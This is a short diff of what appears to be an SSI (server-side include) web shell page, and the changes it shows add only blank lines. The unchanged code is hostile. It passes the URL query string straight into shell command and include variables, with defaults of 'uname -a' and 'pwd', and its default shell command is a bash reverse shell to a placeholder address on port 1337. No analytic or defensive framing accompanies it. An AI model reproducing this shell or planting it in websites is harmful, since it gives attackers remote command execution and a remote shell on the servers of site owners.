@@ -1,16 +1,20 @@
 
 <!--#config errmsg="[Error]"-->
 <!--#set var="zero" value="" -->
+
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
 <!--#set var="shl" value="bash -i >& /dev/tcp/0.0.0.0/1337 0>&1" --> 
 <!--#else -->
 <!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
+
+
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
 <!--#set var="uanmequery" value="uname -a" --> 
 <!--#else -->
 <!--#set var="uanmequery" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
+
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
 <!--#set var="currentpath" value="pwd" --> 
 <!--#else -->
@@ -40,6 +44,7 @@
 <!--#else -->
 <!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
+
 <html>
 <head>
 <title>
